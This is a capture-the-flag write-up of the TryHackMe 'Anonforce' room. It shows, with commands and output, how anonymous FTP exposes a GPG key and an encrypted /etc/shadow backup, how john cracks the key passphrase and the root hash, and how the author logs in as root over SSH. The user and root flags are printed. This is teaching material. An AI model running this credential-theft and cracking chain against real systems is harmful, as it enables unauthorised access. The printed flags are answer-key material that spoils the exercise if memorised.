# TryHackMe: Anonforce

**Category:** Linux, FTP Enumeration, Password Cracking, Privilege Escalation

---

## 📖 Overview

**Anonforce** is an easy Linux-based TryHackMe room focused on anonymous FTP access, GPG decryption, password cracking, and SSH privilege escalation. The challenge demonstrates how improperly exposed backup files and weak password management can lead to full system compromise.

The objective is to obtain both:

* `user.txt`
* `root.txt`

---

# 🔍 Phase 1: Reconnaissance & Enumeration

## 1. Initial Port Scanning

A full TCP scan was performed using `nmap` with default scripts and service detection enabled:

```bash
nmap -sC -sV -v 10.48.145.193
```
```
~
❯ nmap -sC -sV -v 10.48.145.193
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 12:02 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Initiating Ping Scan at 12:02
Scanning 10.48.145.193 [2 ports]
Completed Ping Scan at 12:02, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:02
Completed Parallel DNS resolution of 1 host. at 12:02, 0.00s elapsed
Initiating Connect Scan at 12:02
Scanning 10.48.145.193 (10.48.145.193) [1000 ports]
Discovered open port 21/tcp on 10.48.145.193
Discovered open port 22/tcp on 10.48.145.193
Completed Connect Scan at 12:02, 1.15s elapsed (1000 total ports)
Initiating Service scan at 12:02
Scanning 2 services on 10.48.145.193 (10.48.145.193)
Completed Service scan at 12:02, 0.17s elapsed (2 services on 1 host)
NSE: Script scanning 10.48.145.193.
Initiating NSE at 12:02
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 12:02, 2.27s elapsed
Initiating NSE at 12:02
Completed NSE at 12:02, 1.13s elapsed
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Nmap scan report for 10.48.145.193 (10.48.145.193)
Host is up (0.076s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 May 27 22:00 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  101 0        0               0 May 27 22:00 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 May 27 22:00 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 May 27 22:00 sys
| drwxrwxrwt    9 0        0            4096 May 27 22:00 tmp [NSE: writeable]
| drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
| drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
| lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
|_lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.250.180
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.19 seconds

~
❯
```

### Scan Results

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

### Key Findings

- Anonymous FTP login is enabled.
- SSH service is accessible.
- No HTTP service is exposed.

The FTP service immediately becomes the primary attack surface.

---

# 📂 Phase 2: Anonymous FTP Enumeration

## 1. Logging Into FTP

We authenticate using the built-in anonymous account:

```bash
ftp 10.48.145.193
```

Credentials:

```text
Username: anonymous
Password: anonymous
```
Because active FTP mode caused listing issues, passive mode was enabled:

```bash
passive
```

```
~
❯ ftp 10.48.145.193
Connected to 10.48.145.193.
220 (vsFTPd 3.0.3)
Name (10.48.145.193:xyzsteven): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp>
```
---

## 2. Exploring the File System

Listing the FTP root reveals that the server exposes almost the entire Linux filesystem:

```bash
ls
```
```
ftp> ls
227 Entering Passive Mode (10,48,145,193,155,19).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 May 27 22:00 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   92 0        0               0 May 27 22:00 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 May 27 22:00 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 May 27 22:00 sys
drwxrwxrwt    9 0        0            4096 May 27 22:00 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp>
```
Interesting directories:

```text
/home
/notread
/etc
/root
```

This is a severe misconfiguration because sensitive system directories are accessible through FTP.

---

## 3. Enumerating User Directories

Inside `/home`, we discover a valid system user:

```bash
cd /home
ls
```

Output:

```text
melodias
```

Further enumeration shows the first flag:

```bash
cd melodias
ls -la
```
```
ftp> cd /home
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (10,48,145,193,28,23).
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (10,48,145,193,103,67).
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x    3 0        0            4096 Aug 11  2019 ..
-rw-------    1 0        0             117 Aug 11  2019 .bash_history
-rw-r--r--    1 1000     1000          220 Aug 11  2019 .bash_logout
-rw-r--r--    1 1000     1000         3771 Aug 11  2019 .bashrc
drwx------    2 1000     1000         4096 Aug 11  2019 .cache
drwxrwxr-x    2 1000     1000         4096 Aug 11  2019 .nano
-rw-r--r--    1 1000     1000          655 Aug 11  2019 .profile
-rw-r--r--    1 1000     1000            0 Aug 11  2019 .sudo_as_admin_successful
-rw-r--r--    1 0        0             183 Aug 11  2019 .wget-hsts
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp>
```
Discovered file:

```text
user.txt
```

Downloading the file:

```bash
get user.txt
```
```
ftp> get user.txt
227 Entering Passive Mode (10,48,145,193,77,146).
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.0011 seconds (28.5557 kbytes/s)
ftp>
```
Reading locally:

```bash
cat user.txt
```
```
❯ cat user.txt
606083fd33beb1284fc51f411a706af8
```
### User Flag

```text
606083fd33beb1284fc51f411a706af8
```

---

# 🔐 Phase 3: Discovering Sensitive Backup Files

## 1. Exploring Writable Directories

The `/notread` directory is world-writable:

```bash
cd /notread
ls
```
```
ftp> cd notread
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (10,48,145,193,131,191).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp>
```
### Important Discoveries

```text
backup.pgp
private.asc
```

These files strongly indicate:

* encrypted backup data (`backup.pgp`)
* a GPG private key (`private.asc`)

Both files were downloaded locally:

```bash
get backup.pgp
get private.asc
```
```
ftp> get backup.pgp
227 Entering Passive Mode (10,48,145,193,102,164).
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
226 Transfer complete.
524 bytes received in 0.0005 seconds (1.0339 Mbytes/s)
ftp> get private.asc
227 Entering Passive Mode (10,48,145,193,123,73).
150 Opening BINARY mode data connection for private.asc (3762 bytes).
226 Transfer complete.
3762 bytes received in 0.0008 seconds (4.4277 Mbytes/s)
ftp>
```
---

# 🗝️ Phase 4: GPG Key Import & Passphrase Cracking

## 1. Importing the GPG Key

The private key is imported into the local GPG keyring:

```bash
gpg --import private.asc
```
```
❯ gpg --import private.asc
gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
gpg: key B92CD1F280AD82C2/B92CD1F280AD82C2: error sending to agent: No passphrase given
gpg: error building skey array: No passphrase given
gpg: error reading 'private.asc': No passphrase given
gpg: import from 'private.asc' failed: No passphrase given
gpg: Total number processed: 0
gpg:               imported: 1
gpg:       secret keys read: 1

~
❯
```
The import initially failed because the key was protected by a passphrase.

Using loopback mode resolves this:

```bash
gpg --batch --yes --pinentry-mode loopback --passphrase anonforce --import private.asc
```
```
~
❯ gpg --batch --yes --pinentry-mode loopback --passphrase anonforce --import private.asc
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

~
❯
```
Although the key imports successfully, decrypting the backup fails because the passphrase is incorrect.

---

## 2. Extracting the GPG Hash

To crack the passphrase, `gpg2john` was used:

```bash
gpg2john private.asc > hash
```
```
~
❯ gpg2john private.asc > hash

File private.asc

~
❯ cat hash
anonforce:$gpg$*17*54*2048*e419ac715ed55197122fd0acc6477832266db83b63a3f0d16b7f5fb3db2b93a6a995013bb1e7aff697e782d505891ee260e957136577*3*254*2*9*16*5d044d82578ecc62baaa15c1bcf1cfdd*65536*d7d11d9bf6d08968:::anonforce <melodias@anonforce.nsa>::private.asc
```
Generated hash:

```text
anonforce:$gpg$*17*54*2048*...
```

---

## 3. Cracking the GPG Passphrase

John the Ripper successfully cracks the passphrase using `rockyou.txt`:

```bash
john hash --wordlist=/usr/share/dict/rockyou.txt
```
```
~
❯ john hash --wordlist=/usr/share/dict/rockyou.txt
Warning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"
Use the "--format=gpg-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)
1g 0:00:00:00 DONE (2026-05-28 12:24) 20.00g/s 18720p/s 18720c/s 18720C/s lolipop..yourmom
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
### Cracked Passphrase

```text
xbox360
```

---

# 📦 Phase 5: Decrypting the Backup

Using the recovered passphrase, the encrypted backup is decrypted:

```bash
gpg --batch --yes --pinentry-mode loopback --passphrase xbox360 -d backup.pgp
```
```
~
❯ gpg --batch --yes --pinentry-mode loopback --passphrase xbox360 -d backup.pgp
gpg: encrypted with elg512 key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::⏎
```
The decrypted contents reveal a complete `/etc/shadow` file.

Important entries:

```text
root:$6$07nYFaYf$F4VM...
melodias:$1$xDhc6S6G$IQHU...
```

---

# 🔓 Phase 6: Cracking the Root Password

## 1. Extracting the Root Hash

The root hash is stored separately:

```bash
echo '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > root.hash
```

---

## 2. Cracking with John the Ripper

Because SHA512-crypt performs poorly on the local AMD OpenCL stack, CPU-based cracking with John proved significantly faster than Hashcat:

```bash
john root.hash --wordlist=/usr/share/dict/rockyou.txt --format=sha512crypt
```
```
~
❯ john root.hash --wordlist=/usr/share/dict/rockyou.txt --format=sha512crypt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (?)
1g 0:00:00:02 DONE (2026-05-28 12:36) 0.4310g/s 2979p/s 2979c/s 2979C/s honeybear..bethan
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
### Cracked Root Password

```text
hikari
```

---

# 👑 Phase 7: Root Access

Using the recovered password, SSH access as `root` is obtained directly:

```bash
ssh root@10.48.145.193
```

Password:

```text
hikari
```
```
❯ ssh root@10.48.145.193
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@10.48.145.193's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~#
```
Successful login:

```text
Welcome to Ubuntu 16.04.6 LTS
```

---

## Capturing the Root Flag

Listing the root directory:

```bash
ls
```

Discovered file:

```text
root.txt
```

Reading the flag:

```bash
cat root.txt
```
```
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
f706456440c7af4187810c31c6cebdce
root@ubuntu:~#
```
### Root Flag

```text
f706456440c7af4187810c31c6cebdce
```

---

# 🎯 Conclusion

The Anonforce machine was fully compromised through a chain of critical security failures:

* Anonymous FTP Misconfiguration:
  The FTP server exposed sensitive portions of the Linux filesystem to unauthenticated users.
* Sensitive Backup Exposure:
  Encrypted backups and private GPG keys were publicly accessible.
* Weak GPG Passphrase:
  The private key passphrase (`xbox360`) was easily cracked using a common wordlist.
* Credential Disclosure:
  Decrypting the backup revealed the entire `/etc/shadow` file.
* Weak Root Password:
  The root account password (`hikari`) was vulnerable to dictionary attacks.
* Direct Root SSH Access:
  SSH login for the root account was enabled, allowing immediate administrative access after password recovery.

This room demonstrates the severe risks of:
* exposed backup artifacts,
* weak password policies,
* and insecure service configurations.
